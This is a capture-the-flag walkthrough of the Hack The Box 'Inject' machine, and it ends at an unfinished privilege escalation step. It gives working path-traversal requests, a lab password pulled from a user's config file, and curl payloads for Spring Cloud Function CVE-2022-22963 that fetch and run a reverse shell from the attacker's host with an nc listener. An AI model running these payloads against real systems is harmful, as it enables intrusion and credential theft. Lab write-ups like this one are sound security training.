# Inject
Hack the Box - Machine - Inject - Easy

https://app.hackthebox.com/machines/Inject

Machine IP: 10.129.244.93

## Recon

1. I start all CTFs by running nmap to view open ports and include the flags for running default scripts (-sC) and probing open ports for service/version info (-sV)

![image](https://user-images.githubusercontent.com/130006051/230235341-7d9703a9-663d-4b15-b613-2d9512ded3ee.png)


2. Port 22 is almost always useless until we have credentials, so let's start with opening Burp Suite's browser and going to the machine on port 8080

3. I like to start browsing around by clicking all of the links. This helps build the directory tree in Burp Suite as well as lets me know which links actually work. On this site, there are a lot of links that are just anchors that don't actually go anywhere.

4. While I'm working through clicking all the things, I also like to start directory enumeration. For this one, I would use FFuF.

ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.244.93:8080/FUZZ

5. For this machine, I focused on the /upload page. Here you can upload an image and it provides you with a link to view that image.

![image](https://user-images.githubusercontent.com/130006051/230237802-8f78e61a-cae0-4b9d-a186-0c1fc616acc0.png)

![image](https://user-images.githubusercontent.com/130006051/230237856-baa19ea2-f602-4867-87c6-17f66b1849fa.png)

Before clicking "View your Image", turn on the intercept on Burp Suite

## Vulnerability
### Local File Inclusion

6. We can see that the image is stored at /show_image?img=<ImageName>. Send this GET request to the repeater.

7. Change the GET request to /show_image?img=../../../../../../etc/passwd and you see we get the /etc/passwd file. This is a good list to have as it helps with user enumeration.

![image](https://user-images.githubusercontent.com/130006051/230238964-dd298709-a649-4fe7-92c5-95318f7696f3.png)

8. At this point, I try to see how many directories I can get to. Especially home directories.

![image](https://user-images.githubusercontent.com/130006051/230239207-41fe3b12-531e-4993-bad6-fbd5c0319e84.png)

9. Search in both the user's directories for any information that may be valuable.

10. One piece of valuable information can be found at /home/frank/.m2/setting.xml. For some reason, Frank has Phil's username and password.

username: phil

password: DocPhillovestoInject123

11. Since I have a username and password, I like to try and log in using SSH, but no such luck this time.

12. While continuing to search through the website information using the LIF method, I found that the page was using [Spring Framework](https://spring.io).

![image](https://user-images.githubusercontent.com/130006051/230240670-cfb76bde-6c0f-480c-9c2a-30c58ae4d835.png)

## Exploit - Spring4Shell - CVE-2022-22963

https://sysdig.com/blog/cve-2022-22963-spring-cloud/

13. An easy test to see if this site is vulnerable to this exploit is by running a curl command to see if we can create a file within the /tmp directory which we'll check using the LFI in Burp.

curl -X POST -H "Host: 10.129.244.93:8080" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('touch /tmp/test')" --data-binary "exploit_poc" "http://10.129.244.93:8080/functionRouter"

NOTE: The curl will return an error about a "Type conversion problem". This is okay. Check that the file was created in /tmp using Burp.

Looks like we have a winner! This means we can execute commands on the server. 

14. Now I need to upload a reverse shell and execute it to gain access to the server

[Generate the reverse shell payload](https://www.revshells.com/)

15. Start the listener

nc -lnvp 1337

16. Start python webserver in the directory that the reverse shell is located

python3 -m http.server 80

17. Upload the payload

curl -X POST -H "Host: 10.129.244.93:8080" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('curl http://10.10.14.158:80/newshell.sh -o /tmp/newshell.sh')" --data-binary "exploit_poc" "http://10.129.244.93:8080/functionRouter"

18. Execute the reverse shell

curl -X POST -H "Host: 10.129.244.93:8080" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('bash /tmp/newshell.sh')" --data-binary "exploit_poc" "http://10.129.244.93:8080/functionRouter"

19. We've got a shell!

![image](https://user-images.githubusercontent.com/130006051/230243773-d05f83c9-7eda-4ef0-846a-5fd27468466b.png)

20. The user.txt file is located at /home/phil/ but we are getting access denied when we try to read it. Luckily, we know Phil's password from our recon earlier.

su phil

21. This one is a little strange because we do not get a prompt back, but if we issue a few commands, we can verify we have a shell as Phil.

![image](https://user-images.githubusercontent.com/130006051/230244167-079f395a-ba4c-4058-bcd7-50027e507e38.png)

22. Now let's read the file and get the first flag!

cat user.txt

## Privilege Escalation
### Ansible Playbook Tasks

23. 
